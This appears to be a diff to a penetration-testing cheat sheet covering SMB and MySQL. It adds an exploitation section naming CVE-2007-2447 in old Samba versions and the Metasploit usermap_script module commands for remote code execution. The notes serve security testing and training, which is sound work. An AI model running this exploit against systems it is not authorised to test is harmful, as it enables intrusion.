@@ -42,6 +42,15 @@ $ smbclient  \\\\<IP>\\<SHARE>
 - **cd**: change directory
 - **put** <FILE>: upload file to target device
 
+## Exploitation
+### Samba
+**Vulnerability**: Samba 3.0.20 < 3.0.25rc3 can be vulnerable to **CVE-2007-2447**, which allows remote code execution due to insufficient access control.
+#### Exploitation using Metasploit
+```bash
+use exploit/multi/samba/usermap_script
+set RHOSTS
+set LHOST
+```
 # MySQL (3306)
 ## Connection 
 ```bash
